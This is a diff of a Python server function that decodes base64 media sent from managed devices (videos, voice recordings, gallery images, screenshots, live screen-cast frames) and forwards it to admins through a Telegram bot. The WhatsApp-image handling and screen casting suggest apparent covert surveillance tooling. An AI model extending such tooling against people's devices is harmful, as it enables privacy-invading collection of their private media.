@@ -2949,12 +2949,23 @@ def _process_whatsapp_image(dev, data, sid):
 
 
 def _process_base64_media(dev, data, sid):
-    """Process base64 media — shared between Socket.IO and REST."""
+    """Process base64 media — shared between Socket.IO and REST.
+
+    ⚡ V11.2: يدعم الصور / الفيديو / الصوت بناءً على mime type
+    - image/jpeg, image/png → send_photo
+    - video/mp4 → send_video
+    - audio/3gpp, audio/mp4, audio/mpeg → send_audio
+    - أي شيء آخر → send_document (fallback)
+    """
     media_type = data.get("type", "unknown")
     mime = data.get("mime", "image/jpeg")
     b64data = data.get("data", "")
+    file_name = data.get("name", "")
+    duration = data.get("duration", 0)
+    index = data.get("index", 0)
+    total = data.get("total", 0)
     logger.info(f"📸 base64_media from #{dev.get('short_id', '?')}: "
-                f"type={media_type} size={len(b64data)} chars")
+                f"type={media_type} mime={mime} size={len(b64data)} chars name={file_name}")
 
     if not b64data:
         logger.warning("⚠️ Empty base64 media data")
@@ -2963,16 +2974,31 @@ def _process_base64_media(dev, data, sid):
     try:
         import base64 as _b64
         binary = _b64.b64decode(b64data)
-        logger.info(f"📸 Decoded {len(binary)} bytes — sending to bot")
+        logger.info(f"📸 Decoded {len(binary)} bytes — routing to bot")
 
         if mdm_bot:
             short_label = _dev_label(dev)
             from io import BytesIO
             bio = BytesIO(binary)
 
-            # ⚡ تمييز صور البث المباشر عن لقطات الشاشة العادية
-            is_cast_frame = (media_type == "screen_cast_frame")
-            if is_cast_frame:
+            # ⚡ توجيه بناءً على mime type
+            mime_lc = (mime or "").lower()
+            is_image = mime_lc.startswith("image/")
+            is_video = mime_lc.startswith("video/")
+            is_audio = mime_lc.startswith("audio/")
+
+            # ⚡ Caption مخصص لكل نوع
+            if is_video:
+                idx_str = f" ({index}/{total}) " if total > 0 else " "
+                cap = f"🎬 <b>فيديو</b>{idx_str}\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes"
+                if file_name:
+                    cap += f"\n📁 {file_name}"
+                caption = cap
+            elif is_audio:
+                dur_str = f"\n⏱ المدة: {duration} ثانية" if duration > 0 else ""
+                cap = f"🎤 <b>تسجيل صوتي</b>\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes{dur_str}"
+                caption = cap
+            elif media_type == "screen_cast_frame":
                 from datetime import datetime as _dt
                 now_str = _dt.now().strftime("%H:%M:%S")
                 caption = (f"📺 <b>بث مباشر</b>\n"
@@ -2980,15 +3006,65 @@ def _process_base64_media(dev, data, sid):
                           f"🕐 {now_str}\n"
                           f"📏 {len(binary)} bytes")
             else:
-                caption = f"📸 <b>لقطة شاشة</b>\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes"
+                # screenshot or gallery_image
+                idx_str = f" ({index}/{total}) " if total > 0 else " "
+                cap = f"📸 <b>لقطة شاشة</b>{idx_str}\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes"
+                caption = cap
+
+            # ⚡ truncate caption to 1024 chars (Telegram limit)
+            if len(caption) > 1024:
+                caption = caption[:1020] + "..."
+
+            # ⚡ اسم الملف الافتراضي إذا لم يُحدد
+            if not file_name:
+                if is_video:
+                    file_name = f"video_{dev.get('short_id', 'x')}_{int(__import__('time').time())}.mp4"
+                elif is_audio:
+                    file_name = f"audio_{dev.get('short_id', 'x')}_{int(__import__('time').time())}.3gp"
+                else:
+                    file_name = f"image_{dev.get('short_id', 'x')}_{int(__import__('time').time())}.jpg"
 
             for admin_id in Config.ADMIN_IDS:
                 try:
-                    mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
+                    if is_video:
+                        bio.seek(0)
+                        mdm_bot.bot.send_video(admin_id, video=bio, caption=caption,
+                                                filename=file_name, parse_mode="HTML")
+                        logger.info(f"✅ Video sent to admin {admin_id} ({len(binary)} bytes)")
+                    elif is_audio:
+                        bio.seek(0)
+                        # ⚡ duration بالثوانٍ (Telegram يتوقع integer)
+                        dur_arg = int(duration) if duration and duration > 0 else None
+                        try:
+                            if dur_arg:
+                                mdm_bot.bot.send_audio(admin_id, audio=bio, caption=caption,
+                                                       duration=dur_arg, parse_mode="HTML")
+                            else:
+                                mdm_bot.bot.send_audio(admin_id, audio=bio, caption=caption,
+                                                       parse_mode="HTML")
+                        except Exception as audio_err:
+                            # بعض إصدارات telebot لا تقبل duration kwarg
+                            logger.warning(f"send_audio with duration failed, retrying without: {audio_err}")
+                            bio.seek(0)
+                            mdm_bot.bot.send_audio(admin_id, audio=bio, caption=caption, parse_mode="HTML")
+                        logger.info(f"✅ Audio sent to admin {admin_id} ({len(binary)} bytes)")
+                    else:
+                        # صورة
+                        bio.seek(0)
+                        mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
+                        logger.info(f"✅ Photo sent to admin {admin_id} ({len(binary)} bytes)")
                     bio.seek(0)
-                    logger.info(f"✅ {'Screen cast frame' if is_cast_frame else 'Screenshot'} sent to admin {admin_id}")
                 except Exception as e:
-                    logger.error(f"❌ Failed to send to admin {admin_id}: {e}")
+                    # ⚡ fallback: أرسل كـ document إذا فشل الإرسال المتخصص
+                    logger.error(f"❌ Failed to send media to {admin_id} as {mime}: {e}")
+                    try:
+                        bio.seek(0)
+                        mdm_bot.bot.send_document(admin_id, document=bio, filename=file_name,
+                                                  caption=caption, parse_mode="HTML")
+                        bio.seek(0)
+                        logger.info(f"✅ Fallback: sent as document to {admin_id}")
+                    except Exception as e2:
+                        logger.error(f"❌ Document fallback failed: {e2}")
 
         if sid:
             _pending_cmds.pop(sid, None)
